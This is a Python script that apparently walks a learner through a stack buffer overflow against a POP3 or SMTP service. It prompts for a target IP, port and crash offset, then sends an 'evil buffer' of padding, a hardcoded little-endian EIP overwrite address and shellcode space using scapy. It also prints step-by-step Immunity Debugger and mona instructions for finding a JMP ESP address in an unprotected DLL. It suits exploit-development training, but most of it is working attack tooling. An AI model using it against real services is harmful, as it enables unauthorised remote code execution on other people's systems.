#!/usr/bin/python3.7
null    = "Written by coolhandsquid"

import socket
from scapy.all import *
import os

print("The purpose of this script is to give you step by step directions to find the register address to use as your EIP")
print("Due to technical incompitence with hexidecimal characters and escape charcters you will need to change line 23 to fit your desired register address. If you don't know or are just starting use B's")
ipaddr  = input("What is the ip of the machine you are trying to break\n> ")
portnum = input("What is the port number of the application you are trying to fuzz?\n> ")
portnum = int(portnum)
shellspace   = input("How much space do we have for shellcode (verified in step 6).\n> ")
shellspace   = int(shellspace)
location        = input("What was the crash location?\n> ")
location        = int(location)
service_greeting        = "PASS "
if portnum      == 25:
	service_greeting        = "HELO "
elif portnum    == 110:
	service_greeting        = "PASS "

s       = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



###VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV###

EIP     = "\x8f\x35\x4a\x5f"

###^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^####
#if you know the address use this format from line 27 (REMEMBER TO WRITE IT IN LITTEL ENDIAN!!)
#5F4A358F WILL LOOK LIKEvv
#"\x8f\x35\x4a\x5f"
#if you don't know the address just use B"s
#"BBBB"

buffer  = "A" * location + EIP  + "C" * shellspace
#buffer	= "A" * 2606 + "\x8f\x35\x4a\x5f"  + "C" * shellspace


print("\nSending evil buffer...")

#s.connect((ipaddr, portnum))
#data = s.recv(1024)
a       = "USER username" + "\r\n"
#s.send(a)
#data = s.recv(1024)
b       = service_greeting + buffer + "\r\n"
#s.send(b.encode())
#
#send(IP(dst= ipaddr)/TCP(dport= portnum)/Raw(load= a))
send(IP(dst= ipaddr)/TCP(dport= portnum)/Raw(load= a + b))
#send(packet)
#IP(dst= ipaddr)/TCP(dport= portnum, flags="S")
print("\nDone! EIP should now be overwritten with {}".format(EIP))


intro   = input("""
At this point in the program you will be explained in step by step detail the basic
instructions of using mona to select the EIP address you want to point your buffer
overflow to which you will write your shellcode.
-note This is only good for programs not using any kind of memory protection.
Press enter to show the steps.""")

print("""
Step 1. Attach and run the program in immunity debugger (like always).

Step 2. Run !mona modules in immunity (bottom bar, !mona modules).

Step 3. Select a dll to investigate that does not use ASLR, DEP, or Rebase.

Step 4. Make sure that that the dll does not have any bad charcters in the base address (0x1000 is just as no good as 0x0010).

Step 5. Go to the executabe modules list (the e in the top banner) and find the dll you are researching. Double click on it to follow its execution method.

Step 6. Now we are looking at the execution method of the potentially vulnerable dll. Hopefully you can search the execution method and you will find either
JMP ESP or
PUSH ESP
RETN

Step 7. If there are none then we will have to search all of the module for JMP ESP or equivelent opcode. We can use the nasm_shell.rb tool to look up opcodes. The JMP ESP opcode is ffe4.

Step 8. Run the mona find script to find JMP ESP registers. Below is an example command.
!mona find -s "\\xff\\xe4" -m slmfc.dll

Step 9. Chose an address that does not have any bad charchters and go to that specific address (hotkey is in top banner) to verify that it does in fact point to jmp esp.

Step 10. Annotate this address. Lets give it shot!! Run this scirpt again putting the address in when asked for an EIP address.

""")

print("Here is a tool for opcode conversions.")
while True:
	os.system("ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb")
	yorn	= input("Would you like to do another conversion? (y/n)\n> ")
	if yorn	== "y":
		continue
	else:
		quit()
